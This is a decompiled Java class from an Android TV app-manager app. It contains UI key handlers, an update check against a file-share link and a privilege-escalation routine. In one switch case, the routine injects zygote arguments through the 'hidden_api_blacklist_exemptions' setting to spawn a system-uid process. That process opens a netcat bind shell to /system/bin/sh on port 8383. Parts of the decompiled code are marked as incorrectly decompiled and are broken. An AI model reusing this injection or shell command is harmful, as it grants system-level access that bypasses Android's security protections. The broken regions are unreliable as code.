package ua;

import android.content.ComponentName;
import android.os.Build;
import android.view.View;
import com.alibaba.sdk.android.oss.signer.SignParameters;
import com.hjq.toast.Toaster;
import com.owen.tvrecyclerview.widget.TvRecyclerView;
import com.yunpan.appmanage.db.MyDb;
import com.yunpan.appmanage.ui.ActivityHome;
import com.yunpan.appmanage.ui.ActivityStart;
import com.yunpan.appmanage.ui.ActivityStudy;
import java.io.IOException;
import java.io.PrintStream;
import java.io.Serializable;
import java.text.DecimalFormat;
import java.util.Iterator;
import java.util.UUID;

/* loaded from: classes.dex */
public final /* synthetic */ class t6 implements TvRecyclerView.OnInBorderKeyEventListener, ec.d, te.l, wg.b, t7.d, u1.j {

    /* renamed from: a, reason: collision with root package name */
    public final /* synthetic */ int f15970a;

    public /* synthetic */ t6(int i10) {
        this.f15970a = i10;
    }

    @Override // te.l
    public Object a(Object obj) {
        switch (this.f15970a) {
            case 7:
                g.b.t(obj);
                throw null;
            case 8:
                return Boolean.valueOf(!((db.g) obj).f4536c);
            default:
                ((db.y) obj).getClass();
                return false;
        }
    }

    @Override // wg.b
    public void accept(Object obj) throws IOException {
        throw ((IOException) obj);
    }

    @Override // t7.d
    public Object apply(Object obj) {
        switch (this.f15970a) {
            case 6:
                x9.w3 w3Var = (x9.w3) obj;
                try {
                    w3Var.f18367d = MyDb.get().getFileInfoDao().getDirSize(w3Var.f18365b + "/");
                    System.out.getClass();
                } catch (Exception unused) {
                }
                jc.a.a(w3Var, "item is null");
                return new mc.k(w3Var);
            default:
                return new z1.e((u1.z) obj);
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(16:21|(1:23)|(1:25)(13:(1:28)|29|(1:31)|32|110|33|(1:35)|36|(1:38)|39|(1:41)|42|(4:44|(2:45|(2:47|(2:113|49)(1:115))(1:114))|53|(2:64|65)(2:60|(2:62|117)(2:63|118)))(2:51|52))|26|29|(0)|32|110|33|(0)|36|(0)|39|(0)|42|(0)(0)) */
    /* JADX WARN: Removed duplicated region for block: B:31:0x00a8  */
    /* JADX WARN: Removed duplicated region for block: B:35:0x00ea A[Catch: Exception -> 0x01c8, TryCatch #4 {Exception -> 0x01c8, blocks: (B:33:0x00c2, B:35:0x00ea, B:36:0x00f2, B:38:0x00f8, B:39:0x0100, B:41:0x0106, B:42:0x010e, B:44:0x012a, B:45:0x019f, B:47:0x01a5, B:49:0x01be, B:51:0x01ca, B:52:0x01d9), top: B:110:0x00c2 }] */
    /* JADX WARN: Removed duplicated region for block: B:38:0x00f8 A[Catch: Exception -> 0x01c8, TryCatch #4 {Exception -> 0x01c8, blocks: (B:33:0x00c2, B:35:0x00ea, B:36:0x00f2, B:38:0x00f8, B:39:0x0100, B:41:0x0106, B:42:0x010e, B:44:0x012a, B:45:0x019f, B:47:0x01a5, B:49:0x01be, B:51:0x01ca, B:52:0x01d9), top: B:110:0x00c2 }] */
    /* JADX WARN: Removed duplicated region for block: B:41:0x0106 A[Catch: Exception -> 0x01c8, TryCatch #4 {Exception -> 0x01c8, blocks: (B:33:0x00c2, B:35:0x00ea, B:36:0x00f2, B:38:0x00f8, B:39:0x0100, B:41:0x0106, B:42:0x010e, B:44:0x012a, B:45:0x019f, B:47:0x01a5, B:49:0x01be, B:51:0x01ca, B:52:0x01d9), top: B:110:0x00c2 }] */
    /* JADX WARN: Removed duplicated region for block: B:44:0x012a A[Catch: Exception -> 0x01c8, TryCatch #4 {Exception -> 0x01c8, blocks: (B:33:0x00c2, B:35:0x00ea, B:36:0x00f2, B:38:0x00f8, B:39:0x0100, B:41:0x0106, B:42:0x010e, B:44:0x012a, B:45:0x019f, B:47:0x01a5, B:49:0x01be, B:51:0x01ca, B:52:0x01d9), top: B:110:0x00c2 }] */
    /* JADX WARN: Removed duplicated region for block: B:51:0x01ca A[Catch: Exception -> 0x01c8, TryCatch #4 {Exception -> 0x01c8, blocks: (B:33:0x00c2, B:35:0x00ea, B:36:0x00f2, B:38:0x00f8, B:39:0x0100, B:41:0x0106, B:42:0x010e, B:44:0x012a, B:45:0x019f, B:47:0x01a5, B:49:0x01be, B:51:0x01ca, B:52:0x01d9), top: B:110:0x00c2 }] */
    @Override // ec.d
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void g(mc.b bVar) throws Exception {
        boolean zContains;
        String strSubstring;
        z7.s sVarG;
        String str;
        com.yunpan.appmanage.util.k kVar;
        switch (this.f15970a) {
            case 1:
                int i10 = ActivityStudy.I;
                try {
                    fa.b0.f5652a.getClass();
                    a2.w0.p("am force-stop com.android.settings");
                } catch (Exception e7) {
                    e7.printStackTrace();
                    fa.b0.f5652a.getClass();
                    a2.w0.p("settings delete global hidden_api_blacklist_exemptions");
                    Thread.sleep(200L);
                    a2.w0.p("am start -a android.settings.SETTINGS");
                    g.b.s(e7, new StringBuilder("报错："));
                }
                if (a2.w0.p("settings put global hidden_api_blacklist_exemptions \"LClass1;->method1(\n15\n--runtime-args\n--setuid=1000\n--setgid=1000\n--runtime-flags=2049\n--mount-external-full\n--target-sdk-version=29\n--setgroups=3003\n--nice-name=runnetcat\n--seinfo=platform:su:targetSdkVersion=29:complete\n--invoke-with\ntoybox nc -s 127.0.0.1 -p 8383 -L /system/bin/sh -l;\n--instruction-set=arm\n--app-data-dir=/data/\n--package-name=com.android.settings\nandroid.app.ActivityThread\n\"").f5648a != 0) {
                    throw new Exception("提权失败");
                }
                Thread.sleep(1000L);
                a2.w0.p("settings delete global hidden_api_blacklist_exemptions");
                Thread.sleep(200L);
                a2.w0.p("am start -a android.settings.SETTINGS");
                if (a2.w0.p("toybox nc localhost 8383").f5648a != 0) {
                    throw new Exception("提权失败");
                }
                a2.w0.p("settings delete global hidden_api_blacklist_exemptions");
                Thread.sleep(200L);
                com.yunpan.appmanage.util.a0.w("已执行");
                bVar.b();
                return;
            case 2:
                int i11 = ActivityStudy.I;
                try {
                    fa.b bVar2 = fa.a.f5646a;
                    if (!bVar2.f()) {
                        throw new Exception("jni服务未激活");
                    }
                    try {
                        bVar2.f5651b.exit();
                    } catch (Exception unused) {
                    }
                    com.yunpan.appmanage.util.a0.w("已关闭,请重新打开管家");
                    bVar.b();
                    return;
                } catch (Exception e10) {
                    bVar.d(e10);
                    return;
                }
            case 3:
                int i12 = ActivityStudy.I;
                try {
                    fa.b bVar3 = fa.a.f5646a;
                    if (!bVar3.f()) {
                        throw new Exception("jni服务未激活");
                    }
                    com.yunpan.appmanage.util.a0.w("正常,uid=" + bVar3.f5651b.getUid());
                    bVar.b();
                    return;
                } catch (Exception e11) {
                    bVar.d(e11);
                    return;
                }
            default:
                if (Build.VERSION.SDK_INT >= 19) {
                    DecimalFormat decimalFormat = com.yunpan.appmanage.util.k.f4034u0;
                    zContains = com.yunpan.appmanage.util.j.f4033a.f4035a.getApplicationInfo().nativeLibraryDir.contains("x86");
                } else {
                    String strL = g.b.l(Build.CPU_ABI, "", new StringBuilder());
                    zContains = strL.contains("x86") && !strL.contains("v");
                }
                try {
                    DecimalFormat decimalFormat2 = com.yunpan.appmanage.util.k.f4034u0;
                    kVar = com.yunpan.appmanage.util.j.f4033a;
                } catch (Exception unused2) {
                }
                boolean z = kVar.f4035a.getPackageManager().getActivityInfo(new ComponentName(kVar.f4035a, (Class<?>) ActivityHome.class), 128).screenOrientation == 1;
                String strH = d.b.H();
                if (strH.isEmpty()) {
                    android.support.v4.media.session.a.B("未获取到签名信息", bVar);
                    return;
                }
                String strSubstring2 = strH.substring(strH.length() - 6);
                DecimalFormat decimalFormat3 = com.yunpan.appmanage.util.k.f4034u0;
                com.yunpan.appmanage.util.k kVar2 = com.yunpan.appmanage.util.j.f4033a;
                if (kVar2.f4055k) {
                    strSubstring2 = g.b.j(strSubstring2, "-uid");
                }
                if (!z) {
                    str = zContains ? "-x86" : "-portrait";
                    String strJ = g.b.j(strSubstring2, ".apk");
                    if (!kVar2.f4041d.equals("com.yunpan.appmanage")) {
                        strJ = g.b.l(kVar2.f4041d, ".apk", new StringBuilder());
                    }
                    ba.o oVar = new ba.o();
                    ba.r rVar = new ba.r("share", "https://share.feijipan.com/s/sVVQAreh", "");
                    rVar.f2750m = "";
                    rVar.f2751n = 1;
                    rVar.f2745g = UUID.randomUUID().toString();
                    String str2 = rVar.f2741c;
                    strSubstring = str2.substring(str2.lastIndexOf("/") + 1);
                    if (strSubstring.contains(".")) {
                        strSubstring = strSubstring.substring(0, strSubstring.indexOf("."));
                    }
                    if (strSubstring.contains("#")) {
                        strSubstring = strSubstring.substring(0, strSubstring.indexOf("#"));
                    }
                    if (strSubstring.contains("?")) {
                        strSubstring = strSubstring.substring(0, strSubstring.indexOf("?"));
                    }
                    rVar.f2744f = strSubstring;
                    sVarG = d.b.b0(s1.g.C(rVar)).g();
                    if (sVarG.o("code").e() == 200) {
                        throw new Exception(sVarG.o("msg").i());
                    }
                    z7.s sVarG2 = sVarG.p("list").l(0).g();
                    rVar.f2750m = sVarG2.o("folderIds").i();
                    String strI = sVarG2.p("fileList").l(0).g().o("folderDesc").i();
                    oVar.f2729d = strI.substring(0, strI.indexOf("_")).trim();
                    oVar.f2728c = Integer.valueOf(strI.substring(strI.indexOf("_") + 1, strI.indexOf(SignParameters.NEW_LINE)).trim()).intValue();
                    oVar.f2730e = strI.trim();
                    oVar.f2733h = rVar.f2745g;
                    oVar.f2732g = rVar.f2744f;
                    oVar.f2731f = "https://share.feijipan.com/s/sVVQAreh";
                    Iterator it = s1.g.y(rVar).iterator();
                    while (true) {
                        if (it.hasNext()) {
                            x9.b6 b6Var = (x9.b6) it.next();
                            PrintStream printStream = System.out;
                            ba.s sVar = b6Var.f18207e;
                            Serializable serializable = sVar.f2761i;
                            printStream.getClass();
                            if (((String) sVar.f2761i).equals(strJ)) {
                                oVar.f2734i = sVar.f2756d;
                                oVar.f2735j = sVar.f2757e;
                            }
                        }
                    }
                    int i13 = oVar.f2728c;
                    String str3 = oVar.f2730e;
                    if (i13 == 0 || str3.isEmpty() || oVar.f2734i == 0) {
                        com.yunpan.appmanage.util.a0.u("无法检测，请在【文件下载】中更新");
                        bVar.b();
                        return;
                    }
                    com.yunpan.appmanage.util.w wVar = com.yunpan.appmanage.util.v.f4106a;
                    int i14 = wVar.f4113d;
                    if (i14 >= oVar.f2728c) {
                        Toaster.show((CharSequence) "没有发现新版本");
                        bVar.b();
                        return;
                    } else {
                        oVar.f2727b = wVar.f4111c;
                        oVar.f2726a = i14;
                        bVar.f(oVar);
                        bVar.b();
                        return;
                    }
                }
                strSubstring2 = g.b.j(strSubstring2, str);
                String strJ2 = g.b.j(strSubstring2, ".apk");
                if (!kVar2.f4041d.equals("com.yunpan.appmanage")) {
                }
                ba.o oVar2 = new ba.o();
                ba.r rVar2 = new ba.r("share", "https://share.feijipan.com/s/sVVQAreh", "");
                rVar2.f2750m = "";
                rVar2.f2751n = 1;
                rVar2.f2745g = UUID.randomUUID().toString();
                String str22 = rVar2.f2741c;
                strSubstring = str22.substring(str22.lastIndexOf("/") + 1);
                if (strSubstring.contains(".")) {
                }
                if (strSubstring.contains("#")) {
                }
                if (strSubstring.contains("?")) {
                }
                rVar2.f2744f = strSubstring;
                sVarG = d.b.b0(s1.g.C(rVar2)).g();
                if (sVarG.o("code").e() == 200) {
                }
                break;
        }
    }

    @Override // com.owen.tvrecyclerview.widget.TvRecyclerView.OnInBorderKeyEventListener
    public boolean onInBorderKeyEvent(int i10, View view) {
        switch (this.f15970a) {
            case 0:
                int i11 = ActivityStart.G;
                if (i10 != 66 && i10 != 17) {
                    if (i10 == 130 || i10 == 33) {
                        s1.g.Z(366, view);
                        break;
                    }
                } else {
                    s1.g.W(366, view);
                    break;
                }
            default:
                if (i10 != 17 && i10 != 66) {
                    if (i10 == 33) {
                        kh.e.b().f("up");
                        break;
                    }
                } else {
                    s1.g.W(555, view);
                    break;
                }
                break;
        }
        return false;
    }

    public /* synthetic */ t6(int i10, int i11, z1.a aVar, boolean z) {
        this.f15970a = 15;
    }

    public /* synthetic */ t6(z1.a aVar, int i10, int i11) {
        this.f15970a = i11;
    }

    public /* synthetic */ t6(z1.a aVar, int i10, long j10) {
        this.f15970a = 14;
    }

    public /* synthetic */ t6(z1.a aVar, long j10, int i10) {
        this.f15970a = 17;
    }

    public /* synthetic */ t6(z1.a aVar, Object obj, int i10) {
        this.f15970a = i10;
    }

    public /* synthetic */ t6(z1.a aVar, Object obj, Object obj2, int i10) {
        this.f15970a = i10;
    }

    @Override // u1.j
    /* renamed from: a, reason: collision with other method in class */
    public void mo12a(Object obj) {
        switch (this.f15970a) {
            case 12:
                ((r1.k0) obj).r(new y1.k(2, new androidx.fragment.app.b0(1), 1003));
                break;
            case 13:
                ((r1.k0) obj).y();
                break;
            case 14:
                ((z1.b) obj).getClass();
                break;
            case 15:
                ((z1.b) obj).getClass();
                break;
            case 16:
                ((z1.b) obj).getClass();
                break;
            case 17:
                ((z1.b) obj).getClass();
                break;
            case 18:
                ((z1.b) obj).getClass();
                break;
            case 19:
                ((z1.b) obj).getClass();
                break;
            case 20:
                ((z1.b) obj).getClass();
                break;
            case 21:
                ((z1.b) obj).getClass();
                break;
            case 22:
                ((z1.b) obj).getClass();
                break;
            case 23:
                ((z1.b) obj).getClass();
                break;
            case 24:
                ((z1.b) obj).getClass();
                break;
            case 25:
                ((z1.b) obj).getClass();
                break;
            case 26:
                ((z1.b) obj).getClass();
                break;
            case 27:
                ((z1.b) obj).getClass();
                break;
            case 28:
                ((z1.b) obj).getClass();
                break;
            default:
                ((z1.b) obj).getClass();
                break;
        }
    }

    public /* synthetic */ t6(z1.a aVar, String str, long j10, long j11) {
        this.f15970a = 24;
    }

    public /* synthetic */ t6(z1.a aVar, boolean z) {
        this.f15970a = 29;
    }
}
